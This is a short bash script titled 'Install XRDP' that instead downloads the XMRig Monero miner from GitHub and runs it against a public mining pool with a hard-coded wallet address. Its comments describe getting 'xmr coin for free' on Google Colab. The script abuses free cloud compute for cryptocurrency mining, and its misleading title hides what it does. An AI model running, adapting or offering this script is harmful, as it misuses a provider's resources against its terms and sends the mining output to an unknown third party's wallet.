#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
tar xzvf xmrig-6.18.0-focal-x64.tar.gz
cd xmrig-6.18.0
./xmrig -o xmrpool.eu:9999 -u 4BHNwbnA8UiFZJMi2qYCyqYTrt8bVrpRx8qrJfwpmq5cLM2mXqtXRZDNTBczym3H2tMULytbsE87ELQminCy8U1YVgDajkz+colab -k --tls
